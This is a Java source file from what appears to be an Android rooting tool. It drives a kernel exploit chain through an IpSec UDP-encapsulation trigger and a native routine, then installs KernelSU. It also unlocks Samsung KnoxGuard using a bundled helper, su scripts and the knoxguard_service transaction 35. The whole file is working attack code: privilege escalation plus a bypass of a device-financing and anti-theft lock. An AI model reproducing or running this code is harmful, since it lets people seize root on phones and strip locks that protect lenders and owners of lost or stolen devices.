package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.SystemClock;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Owns the exploit chain: sets up the IPsec trigger, hands control to the
 * native library and, once the chain has installed KernelSU, applies the
 * mount-master overlay so the freshly installed modules are visible to every
 * process.
 */
final class Runner {

    static final int ICV_LEN = 16;

    private static final String TAG = "dfroot";
    private static final String KG_SERVICE = "knoxguard_service";
    private static final String KG_UNLOCK = "service call " + KG_SERVICE + " 35";
    private static final String KG_STATE = "service call " + KG_SERVICE + " 29";
    private static final String KGTA_ASSET = "kgta_helper";
    private static final long OVERLAY_CLAIM_TIMEOUT_MS = 120000;
    private static final long OVERLAY_POLL_MS = 3000;
    private static final long OVERLAY_SU_TIMEOUT_MS = 10;

    private static final AtomicBoolean CLAIMED = new AtomicBoolean(false);
    private static final AtomicBoolean OVERLAY_RUNNING = new AtomicBoolean(false);

    private Runner() {
    }

    static boolean claim() {
        return CLAIMED.compareAndSet(false, true);
    }

    static void release() {
        CLAIMED.set(false);
    }

    static boolean isClaimed() {
        return CLAIMED.get();
    }

    static String suScript(long timeoutSeconds, String script) {
        String out = runAndRead(timeoutSeconds, "su", "--mount-master", "-c", script);
        if (out == null) {
            out = runAndRead(timeoutSeconds, "su", "-c", script);
        }
        return out;
    }

    static int run(Context ctx, IReporter reporter, boolean softReboot) throws Exception {
        Stats.exploitRun();
        TargetGuard.Result target = TargetGuard.check(ctx);
        if (!target.ok) {
            reporter.report("target refused: " + target.detail + "\n");
            throw new IllegalStateException("target refused: " + target.detail);
        }
        IpSecManager.UdpEncapsulationSocket encapSock = null;
        IpSecManager.SecurityParameterIndex spiObj = null;
        IpSecTransform transform = null;
        DatagramSocket senderSock = null;
        android.os.ParcelFileDescriptor senderFd = null;
        try {
            reporter.report("=== setup ===\n");
            IpSecManager ipsec = (IpSecManager) ctx.getSystemService(Context.IPSEC_SERVICE);
            if (ipsec == null) {
                throw new IllegalStateException("no IPSEC_SERVICE");
            }

            encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            reporter.report("encap port: " + encapPort + "\n");

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            spiObj = ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");

            SecureRandom rng = new SecureRandom();
            byte[] aesKey = new byte[32];
            rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32];
            rng.nextBytes(hmacKey);

            IpSecAlgorithm enc = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();

            transform = new IpSecTransform.Builder(ctx)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            if (!AssetPrep.isStaged(ctx)) {
                stageAsset(ctx, "ksud", true, ctx.getFilesDir());
            }
            File ksud = new File(ctx.getFilesDir(), "ksud");
            if (!ksud.isFile() || ksud.length() == 0) {
                stageAsset(ctx, "ksud", true, ctx.getFilesDir());
            }
            reporter.report("ksud staged to: " + ksud.getAbsolutePath()
                    + " (" + ksud.length() + " bytes)\n");
            reporter.report("\n=== exploit ===\n");

            // Hand the already-bound socket fd to the native side instead of
            // closing it and racing to re-bind the same port there.
            senderFd = android.os.ParcelFileDescriptor.fromDatagramSocket(senderSock);
            int rc = Native.nativeRunAll(reporter, encapPort, spiVal,
                    aesKey, hmacKey, ICV_LEN, senderFd.getFd(),
                    ksud.getAbsolutePath(), softReboot);
            closeQuietly(senderFd);
            senderFd = null;
            closeQuietly(senderSock);
            senderSock = null;

            if (rc == 0) {
                applyOverlay(ctx, reporter, 120000L);
            }
            return rc;
        } finally {
            closeQuietly(senderFd);
            closeQuietly(senderSock);
            closeQuietly(transform);
            closeQuietly(spiObj);
            closeQuietly(encapSock);
        }
    }

    static void applyOverlay(Context ctx, IReporter reporter, long maxWaitMillis) {
        long claimDeadline = SystemClock.elapsedRealtime() + OVERLAY_CLAIM_TIMEOUT_MS;
        while (true) {
            if (OVERLAY_RUNNING.compareAndSet(false, true)) {
                try {
                    applyOverlayLocked(ctx, reporter, maxWaitMillis);
                    return;
                } finally {
                    OVERLAY_RUNNING.set(false);
                }
            } else if (SystemClock.elapsedRealtime() > claimDeadline) {
                reporter.report("[overlay] another application never finished; skipped\n");
                return;
            } else {
                try {
                    Thread.sleep(OVERLAY_POLL_MS);
                } catch (InterruptedException e) {
                    return;
                }
            }
        }
    }

    private static void applyOverlayLocked(Context ctx, IReporter reporter, long maxWaitMillis) {
        reporter.report("[overlay] ns app=" + readLink("/proc/self/ns/mnt")
                + " su=" + firstLine(runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "-c", "readlink /proc/self/ns/mnt"))
                + " su--mount-master=" + firstLine(runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "readlink /proc/self/ns/mnt"))
                + "\n");

        long deadline = SystemClock.elapsedRealtime() + maxWaitMillis;
        int attempts = 0;
        boolean usable = false;
        while (!usable) {
            attempts++;
            usable = suUsable();
            if (!usable && SystemClock.elapsedRealtime() < deadline) {
                try {
                    Thread.sleep(OVERLAY_POLL_MS);
                } catch (InterruptedException e) {
                    return;
                }
            } else {
                break;
            }
        }
        if (!usable) {
            reporter.report("[overlay] su still not usable after " + attempts + " checks; overlay skipped\n");
            return;
        }
        reporter.report("[overlay] su usable after " + attempts + " check(s)\n");

        File applyScript = new File("/data/dfroot/apply.sh");
        if (!applyScript.exists()) {
            reporter.report("[overlay] " + applyScript + " not present; skipped (KernelSU mounts modules itself)\n");
        } else {
            String out = runAndRead(90L, "su", "--mount-master", "-c", "sh " + applyScript);
            if (out == null) {
                reporter.report("[overlay] did not run (no su, or it timed out)\n");
            } else {
                reporter.report("[overlay] applied\n" + out);
            }
        }

        applyKgFix(ctx, reporter);
    }

    /**
     * Two unlock paths. The vendor HAL (vendor.samsung.hardware.tlc.kg-service)
     * accepts uid 0/1000 and exposes tz_unlockScreen without the KG STATUS
     * permission, so the root helper works even when the Java service rejects
     * uid 10085. The Java path still runs afterwards for the lock-screen
     * unbind and the cached knox.kg.state property. Both are idempotent.
     *
     * Transaction codes are the empirical AIDL order used by the vendor
     * service: 29 = getKgState, 35 = unlockScreen. A firmware change shows up
     * as an odd parcel and the raw output stays in the log.
     */
    static final class KgResult {
        int pre = -1;
        int post = -1;
        int unlock = -1;
        int unlockErr = 0;
        boolean skipped;
        boolean serviceOk;
        boolean broadcast;
        String raw = "";
    }

    /**
     * State-first unlock. The helper reports pre state, only unlocks in
     * Active(2)/Locked(3), and reports post state; the shell gates the
     * service call on that pre state so a Prenormal/Checking device never
     * reaches the TA. The service call runs as the kgclient uid (resolved,
     * not hardcoded) for the lockscreen unbind and the property mirror.
     * MANUAL_UNLOCK is a client-side cleanup and is sent only after the TA
     * reports a real unlock.
     */
    static KgResult applyKgOnly(Context ctx, IReporter reporter) {
        return applyKgFix(ctx, reporter);
    }

    private static KgResult applyKgFix(Context ctx, IReporter reporter) {
        KgResult res = new KgResult();
        if (!KgWatchdog.enabled(ctx)) {
            reporter.report("[kg] disabled by preference\n");
            return res;
        }
        int uid = kgUid(ctx);
        String out = runKgScript(ctx, uid);
        if (out == null) {
            reporter.report("[kg] su did not answer\n");
            res.unlockErr = -1006;
            return res;
        }
        res.raw = out;
        parseHal(out, res);
        int before = res.pre >= 0 ? res.pre
                : TextParse.kgState(Probes.prop("knox.kg.state"));
        res.pre = before;
        if (before == 0 || before == 1 || before == 5) {
            res.post = before;
            reporter.report("[kg] state=" + TextParse.kgStateName(before)
                    + ", not unlockable; skipped\n");
            return res;
        }
        boolean serviceOk = serviceSucceeded(out);
        String prop = section(out, "@@PROP@@");
        int state = res.post >= 0 ? res.post : TextParse.kgState(prop);

        // Nested `su <uid>` is not guaranteed on every su build; if the
        // service section failed, retry it the way the old flow did.
        if (!serviceOk && before >= 2 && before <= 4) {
            String fallback = runAndRead(30L, "su", String.valueOf(uid), "-c", KG_UNLOCK);
            if (fallback != null && fallback.contains("Result:")) {
                serviceOk = true;
            }
            prop = Probes.prop("knox.kg.state");
            int fromProp = TextParse.kgState(prop);
            if (fromProp >= 0) {
                state = fromProp;
            }
        }

        if ((state == 2 || state == 3) && res.unlockErr == 0) {
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            String retry = runKgScript(ctx, uid);
            if (retry != null) {
                res.raw = retry;
                parseHal(retry, res);
                serviceOk = serviceSucceeded(retry);
                prop = section(retry, "@@PROP@@");
                state = res.post >= 0 ? res.post : TextParse.kgState(prop);
            }
        }
        res.post = state;
        res.serviceOk = serviceOk;

        boolean real = state == 4 || (state >= 0 && state != 2 && state != 3);
        if (real && (res.unlockErr == 0 || res.skipped)) {
            reporter.report(KgBroadcast.apply(ctx));
            res.broadcast = true;
        } else {
            reporter.report("[kg-broadcast] skipped (no confirmed unlock)\n");
        }
        reporter.report("[kg] pre=" + TextParse.kgStateName(res.pre)
                + " unlock=" + res.unlock
                + " err=" + kgError(res.unlockErr)
                + " post=" + TextParse.kgStateName(state)
                + " prop=" + (prop == null || prop.trim().isEmpty() ? "?" : prop.trim())
                + " service=" + (serviceOk ? "ok" : "fail") + "\n");
        return res;
    }

    private static int kgUid(Context ctx) {
        try {
            return ctx.getPackageManager()
                    .getPackageUid("com.samsung.android.kgclient", 0);
        } catch (Throwable t) {
            return 10085;
        }
    }

    private static String runKgScript(Context ctx, int uid) {
        File helper = new File(ctx.getFilesDir(), KGTA_ASSET);
        if (!helper.isFile() || helper.length() == 0) {
            try (InputStream in = ctx.getAssets().open(KGTA_ASSET);
                 OutputStream out = new FileOutputStream(helper)) {
                byte[] buffer = new byte[8192];
                int read;
                while ((read = in.read(buffer)) > 0) {
                    out.write(buffer, 0, read);
                }
            } catch (IOException e) {
                return null;
            }
            helper.setReadable(true, false);
            helper.setExecutable(true, false);
        }
        String script = ""
                + "set +e\n"
                + "HELPER='" + helper.getAbsolutePath() + "'\n"
                + "OUT=$($HELPER unlock)\n"
                + "echo \"$OUT\"\n"
                + "PRE=$(echo \"$OUT\" | sed -n 's/^pre_state=\\(-*[0-9][0-9]*\\).*/\\1/p')\n"
                + "case \"$PRE\" in\n"
                + "  2|3|4)\n"
                + "    echo @@SERVICE@@\n"
                + "    /system/bin/su " + uid + " -c 'service call knoxguard_service 35' 2>&1\n"
                + "    ;;\n"
                + "  *)\n"
                + "    echo @@SERVICE@@\n"
                + "    echo skipped\n"
                + "    ;;\n"
                + "esac\n"
                + "echo @@PROP@@\n"
                + "getprop knox.kg.state\n";
        return Runner.suScript(90L, script);
    }

    private static void parseHal(String out, KgResult res) {
        int pre = intKey(out, "pre_state", res.pre);
        int unlock = intKey(out, "unlock", res.unlock);
        int err = intKey(out, "unlock_err", res.unlockErr);
        int post = intKey(out, "post_state", res.post);
        if (pre >= 0) res.pre = pre;
        res.unlock = unlock;
        res.unlockErr = err;
        if (post >= 0) res.post = post;
        res.skipped = out.contains("skipped=1");
    }

    private static int intKey(String text, String key, int fallback) {
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile(key + "=(-?\\d+)").matcher(text);
        return m.find() ? Integer.parseInt(m.group(1)) : fallback;
    }

    private static String section(String text, String marker) {
        int at = text.indexOf(marker);
        if (at < 0) {
            return "";
        }
        return text.substring(at + marker.length());
    }

    private static boolean serviceSucceeded(String out) {
        String service = section(out, "@@SERVICE@@");
        int prop = service.indexOf("@@PROP@@");
        if (prop >= 0) {
            service = service.substring(0, prop);
        }
        if (service.contains("skipped")) {
            return false;
        }
        if (service.contains("Exception") || service.contains("Error")) {
            return false;
        }
        return service.contains("Result:");
    }

    private static String kgError(int err) {
        switch (err) {
            case 0: return "ok";
            case -1: return "not-attempted";
            case 513: return "RPMB unavailable (513)";
            case 519: return "RPMB HMAC mismatch (519)";
            case -1006: return "TA init failed (-1006)";
            default: return String.valueOf(err);
        }
    }

    private static String oneLine(String value) {
        if (value == null) {
            return "null";
        }
        String flat = value.trim().replace('\n', ' ');
        return flat.length() > 120 ? flat.substring(0, 120) + "..." : flat;
    }

    private static String runAndRead(long timeoutSeconds, String... argv) {
        Process process = null;
        try {
            process = new ProcessBuilder(argv).redirectErrorStream(true).start();
            final StringBuilder out = new StringBuilder();
            final Process running = process;
            Thread reader = new Thread(() -> {
                try (BufferedReader input = new BufferedReader(
                        new InputStreamReader(running.getInputStream()))) {
                    String line;
                    while ((line = input.readLine()) != null && out.length() < 16384) {
                        out.append(line).append('\n');
                    }
                } catch (Throwable ignored) {
                }
            }, "dfroot-read");
            reader.setDaemon(true);
            reader.start();

            if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                process.destroyForcibly();
                process.waitFor(2, TimeUnit.SECONDS);
                reader.join(1000);
                return null;
            }
            reader.join(1000);
            return reader.isAlive() ? null : out.toString();
        } catch (Throwable t) {
            return null;
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    private static boolean suUsable() {
        String out = runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "--mount-master", "-c", "id");
        if (out != null && out.contains("uid=0")) {
            return true;
        }
        out = runAndRead(OVERLAY_SU_TIMEOUT_MS, "su", "-c", "id");
        return out != null && out.contains("uid=0");
    }

    private static String firstLine(String value) {
        if (value == null) {
            return "unavailable";
        }
        int nl = value.indexOf('\n');
        return nl < 0 ? value.trim() : value.substring(0, nl).trim();
    }

    private static String readLink(String path) {
        try {
            Path p = Paths.get(path);
            return Files.readSymbolicLink(p).toString();
        } catch (Throwable t) {
            return "?";
        }
    }

    static void stageAsset(Context ctx, String name, boolean executable, File dir) throws IOException {
        File dest = new File(dir, name);
        File tmp = new File(dest.getPath() + ".tmp");

        try (InputStream in = ctx.getAssets().open(name);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
        }

        if (!tmp.renameTo(dest)) {
            //noinspection ResultOfMethodCallIgnored
            tmp.delete();
            throw new IOException("rename failed: " + dest);
        }
        if (executable) {
            //noinspection ResultOfMethodCallIgnored
            dest.setExecutable(true, false);
        }
    }

    private static void closeQuietly(AutoCloseable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (Throwable ignored) {
            }
        }
    }
}
